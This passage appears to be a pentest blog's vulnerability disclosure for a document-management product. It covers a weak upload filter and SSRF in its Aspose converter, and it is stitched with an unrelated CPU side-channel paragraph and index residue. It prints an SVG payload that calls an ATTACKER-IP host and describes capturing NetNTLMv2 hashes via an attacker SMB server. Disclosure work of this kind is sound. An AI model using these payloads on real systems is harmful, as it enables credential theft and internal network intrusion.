Consider this concrete example: Imagine a web browser displaying a malicious webpage. This webpage can execute JavaScript code that may create a malicious thread.

The malicious thread then uses specific instructions to influence the execution order of instructions in the processor‚Äôs pipeline. This allows it to access the sensitive data from the buffer before the browser has had time to protect it. In summary: The attacker induces the victim to share a memory resource with a malicious thread. The malicious thread uses specific instructions to influence the order of execution of instructions in the processor‚Äôs pipeline. By exploiting the flaws of synchronization primitives, the attacker can access sensitive data that should not be accessible before the victim thread‚Äôs execution ends.

The vulnerabilities in this article may only be applicable in a specific context. Description The Therefore application is too permissive regarding the type of file that can be uploaded by a user. Indeed, it only prevents the uploading of HTML, EXE, and BAK files. An attacker can upload technical files such as PHP, ASP, ASPX, and JSP files. These files could allow, under certain conditions, the execution of system commands (not exploitable here). The image below summarizes the different extensions that can be used in the application (generated with the intruder function of Burp Suite Pro). Exploitation The application prevents HTML files from being uploaded. This protection can be easily bypassed by uploading markdown (MD) files that support HTML. It‚Äôs important to note that it is not possible to upload executable files such as malware. This lack of control over the uploaded content facilitates the exploitation of the following vulnerability. Risks An attacker is able to upload files not controlled by the application. This allows an attacker to more easily exploit SSRF vulnerabilities, upload malicious files (other than exe type), or trigger denial-of-service attacks. An attacker could also, under certain conditions, execute code through the uploaded files (ASP, PHP, JSP files, etc). Mitigation It is advised to limit the type of files to upload to the strictly necessary. A standard user most of the time needs only text processing files (e.g., office and PDF files) and images. It is recommended to limit the number of usable extensions (refer to the extensions managed by the Aspose plugin developer).

Using this type of solution allows the conversion of a large number of different files (more info in Aspose‚Äôs documentation). This presents a risk if the application does not properly manage the filtering of unused extensions. According to the software developer Aspose, security measures should be in place to prevent an attacker from making the server execute internal requests. This attack is called SSRF (Server Side Request Forgery). The solution provided by Therefore is vulnerable to SSRF attacks in several ways. Exploitation Access to a Remote Resource The use of an SVG file illustrates the possibility of making an HTTP GET request by the application to a server controlled by the attacker. The screenshot above illustrates this SSRF vulnerability using an SVG file (available below). \u003csvg width=\"500\" height=\"500\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"\u003e \u003cimage xlink:href=\"http://ATTACKER-IP\"\u003e \u003c/svg\u003e Password hash retrieval In a Windows environment, it is possible to request a resource through a specific path. This functionality can be coupled with this SSRF weakness to redirect the local account of the machine hosting the application to the attacker‚Äôs SMB server. The latter will receive the NetNTLMv2 hash of this service account. In the screenshot below, an SMB server was deployed on the attacker‚Äôs machine. By interpreting the SVG file, the attacker‚Äôs server collects the digest of the machine account FR********4$. This digest could then be relayed and/or cracked to attack the initial client‚Äôs Active Directory environment. Internal network mapping This SSRF vulnerability also allows an attacker to map the internal architecture of the client (if it communicates with the Internet). In the screenshot below, it is possible to reach the server google.fr. The attacker could also use the victim machine as a proxy to impersonate its public IP address. Finally, an attacker is also able to perform the following actions (not conclusive due to lack of time): Port Scanning: it is possible to scan the ports of machines on the network. File Reading: the Aspose plugin seems to be protected against file reading (e.g., the screenshot below. The service redirects to loading the file C:\\Windows\\win.ini but nothing is displayed). Denial of Service: an attacker is able to upload a document referring to very large images. When processing this image, the library consumes memory and time to process these images. Risks The main risks of this vulnerability for clients using this solution are: Credential Theft: an attacker is able to collect the NetNTLMv2 digest of a person uploading remote content. This type of challenge can be cracked by the attacker to retrieve the target user‚Äôs password. Disclosure of Sensitive Images: processing a document containing a reference to a local image file will result in the disclosure of this file in the final document. This can lead to the disclosure of sensitive information. Mapping the Victim‚Äôs Information System: an attacker can map the victim‚Äôs infrastructure and perform service discovery. Denial of Service: an attacker can prevent the machine from functioning properly by rendering it unusable. Mitigation To mitigate this SSRF vulnerability, it is possible to modify the configuration of the Aspose plugin used in the file analysis function. The plugin is able to prevent SSRF attacks. Aspose has already published an article warning about the various risks associated with loading remote elements. The following code example shows how to disable the loading of external images: public class DisableExternalImagesHandler : IResourceLoadingCallback { public ResourceLoadingAction ResourceLoading(ResourceLoadingArgs args) { // Skip external images loading. return (arg","date":"02/02/2024","objectID":"/en/multinational-hacking-with-file-upload-and-ssrf/:4:2","tags":["Penetration Testing","Pentest","CVE"],"title":"How to Hack a 20 billion euro multinational corporation (legally)?","uri":"/en/multinational-hacking-with-file-upload-and-ssrf/"},{"categories":null,"content":"Going further !
